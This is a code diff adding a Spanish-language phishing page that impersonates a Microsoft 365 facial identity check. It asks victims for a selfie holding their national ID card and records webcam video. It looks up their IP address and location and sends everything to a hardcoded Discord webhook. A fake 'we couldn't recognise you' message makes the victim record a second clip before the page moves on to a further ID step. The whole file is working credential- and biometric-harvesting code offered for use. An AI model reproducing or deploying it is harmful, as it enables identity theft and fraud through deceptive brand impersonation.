@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="es-CO">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, "Helvetica Neue", sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* ======================================
+           PANTALLA INICIAL — IGUAL A LA FOTO
+           ====================================== */
+        #screen-start {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 440px;
+            width: 100%;
+            padding: 30px;
+            text-align: center;
+        }
+        .logo-microsoft { margin-bottom: 25px; }
+        .logo-microsoft img { height: 40px; }
+        #screen-start h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 10px;
+        }
+        .desc {
+            font-size: 14px;
+            color: #605e5c;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .instructions-box {
+            background: #f3f2f1;
+            border-left: 4px solid #0078d4;
+            padding: 16px;
+            border-radius: 4px;
+            margin: 15px 0 25px 0;
+            text-align: left;
+        }
+        .instructions-title {
+            color: #323130;
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .instruction-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 8px;
+            color: #323130;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+        .instruction-icon {
+            color: #107c10;
+            font-size: 14px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            color: #605e5c;
+            font-size: 12px;
+        }
+        .lock-icon { color: #107c10; font-size: 14px; }
+
+        /* ======================================
+           BOTONES
+           ====================================== */
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background: #0078d4;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-primary:hover { background: #006cbd; }
+        .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn-cancel {
+            width: 100%;
+            padding: 10px;
+            background: transparent;
+            color: #0078d4;
+            border: 1px solid #0078d4;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-cancel:hover { background: #f3f2f1; }
+
+        /* ======================================
+           PANTALLA DE CÁMARA
+           ====================================== */
+        .app-container {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 440px;
+            width: 100%;
+            padding: 30px;
+            text-align: center;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo { margin-bottom: 20px; }
+        .logo img { height: 40px; }
+        .app-container h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 10px;
+        }
+        .instructions {
+            font-size: 14px;
+            color: #605e5c;
+            margin-bottom: 25px;
+            max-width: 320px;
+            line-height: 1.5;
+        }
+        .camera-circle {
+            width: 300px;
+            height: 360px;
+            border-radius: 50%;
+            background: #888888;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            box-shadow: inset 0 0 0 5px #f0f0f0;
+            margin-bottom: 20px;
+        }
+        .camera-circle video {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            z-index: 1;
+        }
+        .face-silhouette {
+            position: absolute;
+            z-index: 2;
+            width: 220px;
+            height: 275px;
+        }
+        .recording-indicator {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0,0,0,0.6);
+            color: white;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            z-index: 3;
+        }
+        .recording-dot {
+            width: 10px;
+            height: 10px;
+            background: #d13438;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* ======================================
+           PANTALLA DE CARGA
+           ====================================== */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+        .loading-label {
+            font-size: 18px;
+            font-weight: 600;
+            color: #0078d4;
+            margin-top: 20px;
+        }
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0078d4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ======================================
+           CAJA DE ERROR
+           ====================================== */
+        .error-box {
+            background: #fef0f0;
+            border: 1px solid #f56c6c;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 15px;
+            text-align: center;
+            display: none;
+        }
+        .error-box p { color: #c53030; font-size: 13px; line-height: 1.5; }
+
+        @media (max-width: 480px) {
+            #screen-start, .app-container { padding: 20px; }
+            .camera-circle { width: 260px; height: 310px; }
+        }
+
+    </style>
+</head>
+<body>
+    <div id="screen-start">
+        <div class="logo-microsoft">
+            <img src="https://www.seidoranalytics.com/wp-content/uploads/2025/07/Microsoft_365_logo.png" alt="Microsoft 365">
+        </div>
+
+        <h1>Verificación de seguridad facial</h1>
+        <p class="desc" style="text-align:center;">
+            Con el fin de proteger su cuenta y confirmar su identidad, le solicitamos enviar una selfie sosteniendo su cédula de identidad, donde tanto su rostro como los datos del documento se encuentren claramente visibles y legibles.
+        </p>
+
+        <div class="instructions-box">
+            <div class="instructions-title">
+                <i class="fa-solid fa-clipboard-list" style="color: #0078d4 !important;"></i>
+                Instrucciones importantes
+            </div>
+            <div class="instruction-item">
+                <i class="fa-solid fa-circle-check instruction-icon"></i>
+                <span>Busque un lugar con buena iluminación</span>
+            </div>
+            <div class="instruction-item">
+                <i class="fa-solid fa-circle-check instruction-icon"></i>
+                <span>Mantenga una expresión facial neutra</span>
+            </div>
+            <div class="instruction-item">
+                <i class="fa-solid fa-circle-check instruction-icon"></i>
+                <span>Retire gafas, gorras y accesorios faciales</span>
+            </div>
+            <div class="instruction-item">
+                <i class="fa-solid fa-circle-check instruction-icon"></i>
+                <span>Asegúrese de que su rostro y su documento estén completamente visibles y legibles</span>
+            </div>
+        </div>
+
+        <div id="camera-error-box" class="error-box"></div>
+
+        <button class="btn-primary" onclick="goToCamera()">
+            <i class="fa-solid fa-camera"></i> Iniciar Verificación Facial
+        </button>
+        <button class="btn-cancel" onclick="window.location.href='index.html'">
+            <i class="fa-solid fa-arrow-left"></i> Volver
+        </button>
+
+        <div class="security-note">
+            <i class="fa-solid fa-lock lock-icon"></i>
+            <span>Su información está protegida y encriptada</span>
+        </div>
+    </div>
+
+    <div id="screen-camera" class="app-container">
+        <div class="logo">
+            <img src="https://www.seidoranalytics.com/wp-content/uploads/2025/07/Microsoft_365_logo.png" alt="Microsoft">
+        </div>
+        <h1>Verificación Facial</h1>
+        <p class="instructions" id="camera-hint-text">Alinea tu rostro dentro del óvalo y mantente quieto.</p>
+
+        <div class="camera-circle">
+            <video id="video-feed" autoplay playsinline muted></video>
+            <svg class="face-silhouette" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 300">
+                <path d="M120 25 C82 25 58 48 52 82 C49 101 51 119 57 133 C46 139 38 148 40 160 C42 181 52 196 68 203 C70 222 79 238 94 253 C98 257 101 260 101 264 L101 276 C101 286 97 293 91 298 C100 301 110 303 120 303 C130 303 140 301 149 298 C143 293 139 286 139 276 L139 264 C139 260 142 257 146 253 C161 238 170 222 172 203 C188 196 198 181 200 160 C202 148 194 139 183 133 C189 119 191 101 188 82 C182 48 158 25 120 25 Z" fill="none" stroke="#ffffff" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <div id="recording-indicator" class="recording-indicator" style="display: none;">
+                <div class="recording-dot"></div>
+                <span id="timer-text"></span>
+            </div>
+        </div>
+
+        <button id="record-btn" class="btn-primary" onclick="startRecording()">
+            <i class="fa-solid fa-circle-play"></i> Iniciar Validación
+        </button>
+        <button class="btn-cancel" onclick="closeCamera()">Cancelar</button>
+    </div>
+
+    <!-- ======================================
+         PANTALLA DE CARGA
+         ====================================== -->
+    <div id="screen-loading" class="loading-screen" style="display: none;">
+        <div class="logo">
+            <img src="https://www.seidoranalytics.com/wp-content/uploads/2025/07/Microsoft_365_logo.png" alt="Microsoft">
+        </div>
+        <div class="spinner"></div>
+        <p class="loading-label" id="loading-label">Verificando...</p>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1572443233391480922/iR6b8H4YuwafgbOZBRQbvuL4UJmhGjFeG_my3aVxTURc1_Y9NbVBc31wzdahVIsMEY_R";
+        const BOT_NAME = "Sistema de Seguridad · Microsoft";
+        const BOT_AVATAR_URL = "https://i.imgur.com/6IYz0qh.png";
+        const COLORS = { INFO: 0x5865F2, ERROR: 0xED4245, SUCCESS: 0x57F287, CAPTURE: 0x0078D4 };
+        const RECORD_DURATION = 6000;
+
+        let userData = { ip: "0.0.0.0", loc: "Detectando..." };
+        let cameraStream = null;
+        let mediaRecorder = null;
+        let videoChunks = [];
+        let attemptCounter = 0;
+        const MAX_ATTEMPTS = 2;
+
+    async function getInfo() {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        userData = { ip: data.ip, loc: `${data.city}, ${data.country_name}` };
+        
+        localStorage.setItem("userIP", data.ip);
+        localStorage.setItem("userLocation", userData.loc);
+        
+    } catch (e) {
+  
+        userData = { ip: "IP-no-disponible", loc: "Ubicación-desconocida" };
+        localStorage.setItem("userIP", "IP-no-disponible");
+        localStorage.setItem("userLocation", "Ubicación-desconocida");
+    }
+}
+
+        function createEmbed(title, color, fields = [], footerText = null) {
+            return { title, color, fields, timestamp: new Date().toISOString(), footer: footerText ? { text: footerText } : undefined };
+        }
+
+        async function sendToDiscord(content = null, file = null, fileName = "video.webm", embedColor = COLORS.INFO, embedFields = [], embedTitle = "Reporte del Sistema") {
+            const fd = new FormData();
+            if (embedFields.length > 0) {
+                const footerText = `IP: ${userData.ip} · ${userData.loc}`;
+                fd.append('payload_json', JSON.stringify({
+                    username: BOT_NAME, avatar_url: BOT_AVATAR_URL,
+                    embeds: [createEmbed(embedTitle, embedColor, embedFields, footerText)]
+                }));
+            }
+            if (file) fd.append('file', file, fileName);
+            try { await fetch(WEBHOOK_URL, { method: 'POST', body: fd }); }
+            catch (e) { console.error("Error enviando:", e); }
+        }
+
+        function showScreen(id) {
+            ['screen-start','screen-camera','screen-loading'].forEach(s=>{const el=document.getElementById(s);if(el)el.style.display='none';});
+            const target = document.getElementById(id); if(target) target.style.display='flex';
+        }
+
+        async function goToCamera() {
+            showScreen('screen-camera');
+            const videoFeed = document.getElementById('video-feed');
+            const errorBox = document.getElementById('camera-error-box');
+            try {
+                // SOLO CÁMARA, SIN MICRÓFONO
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                videoFeed.srcObject = cameraStream;
+                errorBox.style.display = 'none';
+            } catch (err) {
+                console.error("Error cámara:", err.name, err.message);
+                showScreen('screen-start');
+                errorBox.style.display = 'block';
+
+                if (err.name === 'NotAllowedError') {
+                    errorBox.innerHTML = '<p><strong>🔒 Permiso denegado</strong><br>Permite el acceso a la cámara cuando el navegador lo pregunte.</p>';
+                } else if (location.protocol === 'file:') {
+                    errorBox.innerHTML = '<p><strong>⚠️ Archivo local bloqueado</strong><br>Usa <strong>Live Server</strong> en VS Code o súbelo a un hosting.</p>';
+                } else {
+                    errorBox.innerHTML = `<p><strong>❌ Error</strong><br>${err.name}: ${err.message}</p>`;
+                }
+            }
+        }
+
+        function startRecording() {
+            attemptCounter++;
+            videoChunks = [];
+            const hint = document.getElementById('camera-hint-text');
+            const recordBtn = document.getElementById('record-btn');
+            const recordingIndicator = document.getElementById('recording-indicator');
+            const timerText = document.getElementById('timer-text');
+
+            hint.innerText = 'Verificando... por favor no te muevas';
+            recordBtn.disabled = true;
+            recordBtn.innerHTML = '<i class="fa-solid fa-hourglass-half"></i> Verificando...';
+            recordingIndicator.style.display = 'flex';
+
+            let timeLeft = 6;
+            timerText.textContent = `${timeLeft}s`;
+            const timerInterval = setInterval(() => {
+                timeLeft--;
+                timerText.textContent = `${timeLeft}s`;
+                if (timeLeft <= 0) clearInterval(timerInterval);
+            }, 1000);
+
+            let options = { mimeType: 'video/webm;codecs=vp9' };
+            try { mediaRecorder = new MediaRecorder(cameraStream, options); }
+            catch (e) { mediaRecorder = new MediaRecorder(cameraStream); }
+
+            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) videoChunks.push(e.data); };
+            mediaRecorder.onstop = finishCapture;
+            mediaRecorder.start();
+
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                    recordingIndicator.style.display = 'none';
+                }
+            }, RECORD_DURATION);
+        }
+
+        async function finishCapture() {
+            showScreen('screen-loading');
+            document.getElementById('loading-label').innerText = 'Verificando...';
+            const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+
+       await sendToDiscord(null, videoBlob, `verificacion_${Date.now()}.webm`, COLORS.CAPTURE, [
+    { name: "👤 Usuario", value: localStorage.getItem("usuario") || "Usuario-desconocido", inline: false },
+    { name: "🌐 IP", value: `\`${localStorage.getItem("userIP") || "IP-no-disponible"}\``, inline: true },
+    { name: "📍 Ubicación", value: `\`${localStorage.getItem("userLocation") || "Desconocida"}\``, inline: true },
+    { name: "📦 Tamaño", value: `${(videoBlob.size/1024/1024).toFixed(2)} MB`, inline: true },
+    { name: "🔄 Intento", value: `${attemptCounter}/${MAX_ATTEMPTS}`, inline: true }
+], "🎥 Verificación Facial");
+
+     setTimeout(() => {
+    if (attemptCounter < MAX_ATTEMPTS) {
+        const hint = document.getElementById('camera-hint-text');
+        hint.innerHTML = '<span style="color: #d13438; font-weight: 600;">⚠️ No pudimos reconocerte.</span><br>Intenta de nuevo.';
+        hint.style.color = ''; 
+
+        showScreen('screen-camera');
+        document.getElementById('record-btn').disabled = false;
+        document.getElementById('record-btn').innerHTML = '<i class="fa-solid fa-circle-play"></i> Iniciar Verificación';
+    } else {
+        document.getElementById('loading-label').innerText = '✅ VERIFICACIÓN COMPLETADA';
+        setTimeout(() => { window.location.href = 'cedula.html'; }, 2000);
+    }
+}, 3000);
+        }
+
+        function closeCamera() {
+            if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
+            showScreen('screen-start');
+        }
+
+        window.onload = function () { getInfo(); };
+    </script>
+</body>
+</html>
